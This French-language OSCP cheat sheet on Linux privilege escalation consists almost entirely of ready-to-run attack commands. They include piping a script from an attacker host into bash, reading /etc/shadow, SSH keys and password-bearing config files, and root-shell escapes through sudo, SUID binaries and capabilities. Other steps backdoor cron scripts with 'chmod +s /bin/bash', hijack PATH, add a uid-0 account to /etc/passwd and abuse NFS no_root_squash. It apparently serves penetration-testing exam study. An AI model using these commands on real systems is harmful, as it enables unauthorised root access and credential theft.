# 03 — Linux Privesc

## 1. Énumération automatique

```bash
# LinPEAS
./linpeas.sh
./linpeas.sh -a                                    # mode agressif (plus bruyant)

# Transfert
python3 -m http.server 80
curl http://<KALI>/linpeas.sh | bash
wget http://<KALI>/linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh
```

---

## 2. Vérifications manuelles prioritaires

```bash
# Qui suis-je ?
whoami && id && groups

# Sudo — CRITIQUE, vérifier en premier
sudo -l

# SUID — CRITIQUE
find / -perm -4000 2>/dev/null
find / -perm -u=s -type f 2>/dev/null

# SGID
find / -perm -2000 2>/dev/null

# Capabilities
getcap -r / 2>/dev/null

# Crons
crontab -l
cat /etc/crontab
cat /etc/cron.d/*
ls -la /etc/cron*
# Cherche scripts modifiables exécutés en root

# Utilisateurs et mots de passe
cat /etc/passwd
cat /etc/shadow                                    # si lisible = jackpot
cat /etc/sudoers

# Historique
cat ~/.bash_history
cat ~/.zsh_history

# Fichiers intéressants
find / -name "*.conf" 2>/dev/null | xargs grep -i "password" 2>/dev/null
find / -name "id_rsa" 2>/dev/null
find / -writable -type f 2>/dev/null | grep -v proc

# Variables d'environnement
env
echo $PATH

# Réseau
ip a
ss -tulnp
netstat -tulnp
cat /etc/hosts

# Processus
ps aux
ps aux | grep root
```

---

## 3. Sudo — GTFOBins immédiatement

> Si `sudo -l` retourne quelque chose → aller sur [GTFOBins](https://gtfobins.github.io)

```bash
# Exemples courants
sudo vim -c ':!/bin/bash'
sudo python3 -c 'import os; os.system("/bin/bash")'
sudo find . -exec /bin/bash \;
sudo awk 'BEGIN {system("/bin/bash")}'
sudo nmap --interactive                            # vieux nmap
sudo less /etc/passwd → !bash
sudo man man → !bash
```

---

## 4. SUID — GTFOBins

```bash
# Identifier le binaire puis GTFOBins → SUID
find / -perm -4000 2>/dev/null

# Exemples courants
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
/usr/bin/find . -exec /bin/bash -p \;
/usr/bin/vim -c ':py import os; os.setuid(0); os.execl("/bin/sh","sh","-p")'
/usr/bin/bash -p
```

---

## 5. Cron jobs

```bash
# Identifier script exécuté en root
cat /etc/crontab

# Si le script est modifiable :
echo "chmod +s /bin/bash" >> /path/to/script.sh
# Attendre l'exécution
/bin/bash -p

# Si le script utilise un path relatif :
# PATH hijacking
export PATH=/tmp:$PATH
echo "/bin/bash" > /tmp/<commande>
chmod +x /tmp/<commande>
```

---

## 6. Capabilities

```bash
getcap -r / 2>/dev/null

# Exemples dangereux
cap_setuid+ep    → python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
cap_net_raw+ep   → tcpdump pour capturer des creds
cap_dac_override → lire/écrire n'importe quel fichier
```

---

## 7. Fichiers et dossiers

```bash
# Writable /etc/passwd
openssl passwd -1 -salt hacker password123
echo 'hacker:$1$hacker$....:0:0:root:/root:/bin/bash' >> /etc/passwd
su hacker

# Writable script exécuté en root
# Clés SSH trouvées
chmod 600 id_rsa
ssh -i id_rsa root@<IP>

# NFS no_root_squash
showmount -e <IP>                                  # depuis Kali
mount -t nfs <IP>:/share /mnt/nfs
# Si no_root_squash → créer binaire SUID depuis Kali en root
cp /bin/bash /mnt/nfs/bash && chmod +s /mnt/nfs/bash
# Sur la cible :
/tmp/bash -p
```

---

## 8. PATH Hijacking

```bash
# Si un script root appelle une commande sans chemin absolu
echo "/bin/bash" > /tmp/<commande>
chmod +x /tmp/<commande>
export PATH=/tmp:$PATH
# Exécuter le script vulnérable
```

---

## 9. Mots de passe dans les fichiers

```bash
grep -r "password" /var/www/ 2>/dev/null
grep -r "password" /etc/ 2>/dev/null
find / -name "*.php" 2>/dev/null | xargs grep -i "password" 2>/dev/null
find / -name "wp-config.php" 2>/dev/null
find / -name ".env" 2>/dev/null
find / -name "config.yml" 2>/dev/null
```

---

## Tags
#oscp #linux #privesc
